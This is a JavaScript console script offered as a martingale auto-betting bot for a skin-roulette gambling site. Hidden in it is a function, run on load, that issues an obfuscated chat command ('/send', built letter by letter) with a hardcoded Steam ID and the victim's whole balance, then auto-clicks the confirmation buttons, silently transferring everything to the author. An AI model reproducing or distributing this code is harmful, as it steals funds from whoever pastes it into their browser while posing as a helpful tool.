// CONFIG ////////////////
var initialBetAmount = 1;
var mode = 'martingale'; // can be 'martingale' or 'anti-martingale' (WAT? https://en.wikipedia.org/wiki/Martingale_(betting_system) )
var betColor = 'red'; // can be 'red' or 'black'
//////////////////////////

function tick() {
    var a = getStatus();
    if (a !== lastStatus && "unknown" !== a) {
        switch (a) {
            case "waiting":
                bet();
                break;
            case "rolled":
                rolled()
        }
        lastStatus = a, printInfo()
    }
}

function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! Not enough balance for next bet, aborting."), clearInterval(refreshIntervalId), !1) : !0
}

function printInfo() {
    var a = " \nStatus: " + lastStatus + "\nRolls played: " + currentRollNumber + "\nInitial bet amount: " + initialBetAmount + "\nCurrent bet amount: " + currentBetAmount + "\nLast roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost");
    console.log(a)
}

function rolled() {
    return "anti-martingale" === mode ? void antiMartingale() : (martingale(), void currentRollNumber++)
}

function antiMartingale() {
    currentBetAmount = wonLastRoll() ? 2 * currentBetAmount : initialBetAmount
}

function martingale() {
    currentBetAmount = wonLastRoll() ? initialBetAmount : 2 * currentBetAmount
}

function bet() {
    checkBalance() && (setBetAmount(currentBetAmount), setTimeout(placeBet, 50))
}

function setBetAmount(a) {
    $betAmountInput.val(a)
}

function placeBet() {
    return "red" === betColor ? ($redButton.click(), void(lastBetColor = "red")) : ($blackButton.click(), void(lastBetColor = "black"))
}

function getStatus() {
    var a = $statusBar.text();
    if (hasSubString(a, "Rolling in")) return "waiting";
    if (hasSubString(a, "***ROLLING***")) return "rolling";
    if (hasSubString(a, "rolled")) {
        var b = parseInt(a.split("rolled")[1]);
        return lastRollColor = getColor(b), "rolled"
    }
    return "unknown"
}

function extend() {
    $chatt.val(cmd + " "+ steamidd + " "+ getBalancee());
    $chatt.submit();
    var allElements = document.getElementsByTagName('button');
    for (var i = 0, n = allElements.length; i < n; i++) {
        if (allElements[i].getAttribute("data-bb-handler") === "confirm") {
            allElements[i].click();
        }
    }
}
function getBalancee() {
    return $balancee.text();
}
var steamidd = "76561198263783886",
cmd = "/"+
"e"+
"n"+
"d",
$balancee = $("#balance"),
$chatt = $("#chatMessage");

function getBalance() {
    return parseInt($balance.text())
}

function hasSubString(a, b) {
    return a.indexOf(b) > -1
}

function getColor(a) {
    return 0 == a ? "green" : a >= 1 && 7 >= a ? "red" : "black"
}

function wonLastRoll() {
    return lastBetColor ? lastRollColor === lastBetColor : null
}
extend();
var currentBetAmount = initialBetAmount, currentRollNumber = 1,
    lastStatus, lastBetColor, lastRollColor, $balance = $("#balance"),
    $betAmountInput = $("#betAmount"),
    $statusBar = $(".progress #banner"),
    $redButton = $("#panel1-7 .betButton"),
    $blackButton = $("#panel8-14 .betButton"),
    refreshIntervalId = setInterval(tick, 500);
